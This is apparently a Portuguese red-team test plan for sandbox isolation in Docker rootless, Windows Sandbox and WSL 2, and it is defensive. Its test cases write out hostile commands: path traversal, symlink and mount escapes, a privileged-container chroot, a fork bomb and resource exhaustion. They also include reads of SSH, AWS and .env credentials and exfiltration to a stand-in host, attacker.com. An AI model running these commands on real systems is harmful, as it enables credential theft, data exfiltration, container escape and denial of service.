# PoC/Red Team: Segurança de Runtimes e Sandbox

**Data:** 11 de agosto de 2026  
**Status:** Em andamento  
**Objetivo:** Validar segurança de runtimes e sandbox através de testes de escape e limites

## Escopo

### Tecnologias a testar
1. **Docker rootless** (MVP local)
2. **Windows Sandbox** (Windows)
3. **WSL 2** (Windows)

### Categorias de testes
1. **Escape de filesystem**
2. **Escape de rede**
3. **Escape de runtime**
4. **Limites de recursos**
5. **Proteção de secrets**

## Testes de escape de filesystem

### Teste 1: Path traversal
```bash
# Tentar ler arquivo fora do workspace
cat ../../../etc/passwd
cat ../../../Windows/System32/config/SAM
```

**Esperado:** Falha (permissão negada ou arquivo não encontrado)

### Teste 2: Symlink attack
```bash
# Criar symlink para diretório sensível
ln -s /etc/passwd /workspace/safe_file
ln -s C:/Windows/System32/config/SAM /workspace/safe_file
cat /workspace/safe_file
```

**Esperado:** Falha (symlink bloqueado ou permissão negada)

### Teste 3: Mount point escape
```bash
# Tentar montar diretório host
mount --bind /etc /workspace/mount
mount --bind C:/Windows /workspace/mount
```

**Esperado:** Falha (sem permissão de mount)

## Testes de escape de rede

### Teste 4: DNS queries não autorizadas
```bash
# Tentar resolver domínios não permitidos
nslookup google.com
nslookup internal.company.com
```

**Esperado:** Falha (DNS bloqueado ou timeout)

### Teste 5: Port scanning
```bash
# Tentar escanear portas locais
nmap localhost
nmap 192.168.1.1
```

**Esperado:** Falha (nmap não disponível ou bloqueado)

### Teste 6: Exfiltração de dados
```bash
# Tentar enviar dados para servidor externo
curl http://attacker.com/exfil?data=secret
wget --post-data=secret http://attacker.com/exfil
```

**Esperado:** Falha (rede bloqueada ou DNS falha)

## Testes de escape de runtime

### Teste 7: Acesso ao Docker socket
```bash
# Tentar acessar Docker socket
curl /var/run/docker.sock
curl //./pipe/docker_engine
```

**Esperado:** Falha (socket não montado ou permissão negada)

### Teste 8: Escape de container
```bash
# Tentar escape via privileged mode
docker run --privileged -v /:/host ubuntu chroot /host
```

**Esperado:** Falha (sem modo privileged)

### Teste 9: Acesso a host PID
```bash
# Tentar acessar processos do host
ps aux
cat /proc/1/cmdline
```

**Esperado:** Falha (host PID namespace não compartilhado)

## Testes de limites de recursos

### Teste 10: Fork bomb
```bash
# Tentar consumir todos os processos
:(){ :|:& };:
```

**Esperado:** Processo terminado pelo limitador de PIDs

### Teste 11: Memory exhaustion
```bash
# Tentar consumir toda a memória
python -c "x=' '*10**9"
stress --vm 1 --vm-bytes $(awk '/MemAvailable/{printf "%d\n", $2*1024}' /proc/meminfo)"
```

**Esperado:** Processo terminado pelo limitador de memória

### Teste 12: CPU exhaustion
```bash
# Tentar consumir todo o CPU
stress --cpu 8
```

**Esperado:** Processo limitado por cgroups

## Testes de proteção de secrets

### Teste 13: Leitura de secrets do ambiente
```bash
# Tentar ler variáveis de ambiente
env | grep -i secret
env | grep -i key
env | grep -i token
```

**Esperado:** Secrets não expostos ou prefixo específico

### Teste 14: Leitura de arquivos de secrets
```bash
# Tentar ler arquivos de secrets
cat ~/.aws/credentials
cat ~/.ssh/id_rsa
cat .env
cat /etc/secrets
```

**Esperado:** Falha (paths bloqueados ou permissão negada)

### Teste 15: Exfiltração de secret via output
```bash
# Tentar exfiltrar secret via stdout/stderr
echo $SECRET_KEY
cat ~/.env
```

**Esperado:** Secret redactado ou não presente

## Procedimento de execução

### Setup
1. Preparar ambiente de teste (Docker, Windows Sandbox, WSL 2)
2. Criar script de testes automatizados
3. Configurar monitoramento de recursos
4. Preparar ambiente de captura de logs

### Execução
1. Executar testes em ordem de severidade
2. Capturar logs e métricas
3. Documentar resultados
4. Identificar vulnerabilidades

### Relatório
1. Resumo de vulnerabilidades encontradas
2. Severidade de cada vulnerabilidade
3. Recomendações de mitigação
4. Evidências (logs, screenshots)

## Riscos e mitigações

### Riscos do PoC
- **Execução de código malicioso:** Testes devem ser executados em ambiente isolado
- **Exfiltração de dados:** Ambiente de teste não deve conter dados reais
- **Dano ao sistema:** Testes devem ser executados em máquina dedicada

### Mitigações
- Usar máquina virtual dedicada para testes
- Não usar dados reais nos testes
- Ter snapshot da máquina antes dos testes
- Monitorar recursos durante os testes

## Status de implementação

### Concluído
- [x] Documentar plano de PoC/red team
- [x] Definir categorias de testes
- [x] Definir casos de teste específicos

### Pendente
- [ ] Preparar ambiente de teste
- [ ] Criar script de testes automatizados
- [ ] Executar testes em Docker rootless
- [ ] Executar testes em Windows Sandbox
- [ ] Executar testes em WSL 2
- [ ] Documentar resultados
- [ ] Gerar relatório de vulnerabilidades

## Próximos passos

1. Preparar máquina virtual dedicada para testes
2. Instalar Docker rootless na VM
3. Criar script de testes automatizados
4. Executar testes sequencialmente
5. Documentar resultados e vulnerabilidades
6. Gerar relatório final

## Referências
- Docker Security: https://docs.docker.com/engine/security/
- gVisor: https://gvisor.dev/docs/
- Windows Sandbox: https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-sandbox/windows-sandbox-overview
- WSL 2: https://learn.microsoft.com/en-us/windows/wsl/about
